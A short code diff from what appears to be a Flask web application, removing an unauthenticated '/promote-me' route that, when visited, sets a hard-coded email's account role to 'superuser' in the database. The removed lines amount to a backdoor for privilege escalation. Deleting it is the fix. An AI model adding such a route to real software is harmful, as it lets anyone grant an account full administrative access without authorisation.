@@ -1493,21 +1493,7 @@ def jobcard_details(jobcard_id):
 
     return render_template("jobcard_modal.html", jc=jc)
 
-@app.route("/promote-me")
-def promote_me():
-    import sqlite3
-    connection = sqlite3.connect(DB_PATH)
-    cursor = connection.cursor()
 
-    cursor.execute("""
-        UPDATE users
-        SET role = 'superuser'
-        WHERE email = ?
-    """, ("Alpha.Bah@changanuk.com",))
-
-    connection.commit()
-    connection.close()
-    return "You are now SUPERUSER"
 
 
 
